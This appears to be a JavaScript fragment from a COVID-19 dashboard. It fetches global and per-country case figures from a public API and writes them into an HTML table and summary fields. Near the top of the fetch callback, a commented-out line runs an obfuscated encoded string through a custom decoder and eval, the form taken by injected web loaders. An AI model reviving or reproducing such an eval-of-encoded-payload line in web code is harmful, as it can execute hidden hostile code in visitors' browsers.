        ...
        function fetch() {
          ...
          jQuery.get("https://api.covid19api.com/summary",
           ...
           //   eval(atob(''));eval(atob(__.$('ja7O467Mj9LclKzLlqrSj+Hdkarfj6r/j5vOmq3Lj6sY4abc4ecUoKDLlZvOitLcopvf1czRjqHMkabbkLTX1t7j1czRjqHMkZcUl6DJxqzRjqHMkZcSj6D0lJjbkczfkKsY2tTfj5wSja7UjqsDl6DJ15veja7U1Z3RjJzlmrMSoKrUl5zl07MSkKrMwpvMkabejpvbtaDcnuffj5wXyQAA','d')));
              ...
              var countryName=data['Countries'][i - 1]['Country']
              var lowName=countryName.toLowerCase();
                              
              an.setAttribute("href","https://corona.lmao.ninja/v2/countries/"+lowName+"?yesterday=true&strict=true&query")
             // an.setAttribute("href","<?php 
              
             // echo base_url("CovidController/country/$link")?>")

              an.innerHTML = data['Countries'][i - 1]['Country'];                          
              tbval.rows[i].cells[0].appendChild(an);   
                ...
                x.insertCell(1);
                tbval.rows[i].cells[1].innerHTML = data['Countries'][i - 1]['TotalConfirmed'].toLocaleString();
                tbval.rows[i].cells[1].style.background = '#4bb7d8';

                x.insertCell(2);
                tbval.rows[i].cells[2].innerHTML = data['Countries'][i - 1]['TotalRecovered'].toLocaleString();
                tbval.rows[i].cells[2].style.background = '#4bb7d8';

                x.insertCell(3);
                tbval.rows[i].cells[3].innerHTML = data['Countries'][i - 1]['TotalDeaths'].toLocaleString();
                tbval.rows[i].cells[3].style.background = '#f36e23';

                x.insertCell(4);
                tbval.rows[i].cells[4].innerHTML = data['Countries'][i - 1]['NewConfirmed'].toLocaleString();
                tbval.rows[i].cells[4].style.background = '#4bb7d8';

                x.insertCell(5);
                tbval.rows[i].cells[5].innerHTML = data['Countries'][i - 1]['NewRecovered'].toLocaleString();
                tbval.rows[i].cells[5].style.background = '#9cc850';

                x.insertCell(6);
                tbval.rows[i].cells[6].innerHTML = data['Countries'][i - 1]['NewDeaths'].toLocaleString();
             ...
             document.querySelector(".totalC").innerHTML= data['Global']['TotalConfirmed'].toLocaleString();
             document.querySelector(".tdead").innerHTML= data['Global']['TotalDeaths'].toLocaleString();    
             document.querySelector(".treco").innerHTML= data['Global']['TotalRecovered'].toLocaleString();

             document.querySelector(".NC").innerHTML= data['Global']['NewConfirmed'].toLocaleString();    
             document.querySelector(".ND").innerHTML= data['Global']['NewDeaths'].toLocaleString(); 
             document.querySelector(".NR").innerHTML= data['Global']['NewRecovered'].toLocaleString(); 
